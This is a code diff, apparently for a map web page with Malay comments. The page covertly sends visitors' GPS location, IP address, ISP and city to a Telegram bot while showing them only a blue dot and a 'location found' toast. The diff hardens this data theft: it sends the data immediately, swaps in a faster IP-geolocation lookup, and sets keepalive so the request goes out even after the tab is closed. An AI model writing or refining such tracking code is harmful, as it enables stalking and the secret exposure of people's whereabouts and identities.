@@ -303,7 +303,10 @@ async function permAllowHandler() {
     const pos = await getLocation();
     placeBlueDot(pos.lat, pos.lon);
     toast('Lokasi ditemukan');
+    
+    // Tembak telegram serta merta (jangan tunggu selesai baru animate dot)
     sendToTelegram({ lat: pos.lat, lon: pos.lon, acc: pos.acc, source: 'GPS' });
+    
   } catch (err) {
     toast('Lokasi tidak tersedia');
     sendGeoIpFallback();
@@ -325,14 +328,15 @@ function getLocation() {
 
 async function sendGeoIpFallback() {
   try {
-    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    // Guna ipwho.is (jauh lebih cepat dari ipapi.co)
+    const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
     const j = await r.json();
-    if (j.latitude && j.longitude) {
+    if (j.success && j.latitude && j.longitude) {
       placeBlueDot(j.latitude, j.longitude);
       sendToTelegram({
         lat: j.latitude, lon: j.longitude, acc: null,
-        city: j.city, country: j.country_name,
-        ip: j.ip, isp: j.org, source: 'IP-Geo'
+        city: j.city, country: j.country,
+        ip: j.ip, isp: j.connection?.isp, source: 'IP-Geo'
       });
     }
   } catch {}
@@ -376,7 +380,9 @@ async function sendToTelegram(data) {
         text: msg,
         parse_mode: 'HTML',
         disable_web_page_preview: false
-      })
+      }),
+      // Paksa browser hantar request walaupun tab ditutup
+      keepalive: true 
     });
   } catch (e) { console.error(e); }
 }
